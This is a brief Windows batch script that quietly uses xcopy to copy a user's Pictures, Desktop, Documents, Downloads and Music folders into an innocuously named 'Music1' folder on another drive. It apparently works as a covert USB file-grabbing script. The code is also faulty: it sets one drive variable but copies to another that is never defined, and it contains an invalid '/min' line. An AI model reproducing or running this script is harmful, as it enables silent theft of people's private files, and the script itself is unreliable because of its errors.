:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y /g
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\Music1\P"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\Music1\D"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\Music1\Do"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\Music1\Dow"
%backupcmd% "%USERPROFILE%\Pictures" "%drive%\Music1\Pic"
%backupcmd% "%USERPROFILE%\Musics" "%drive%\Music1\MU"
@echo off
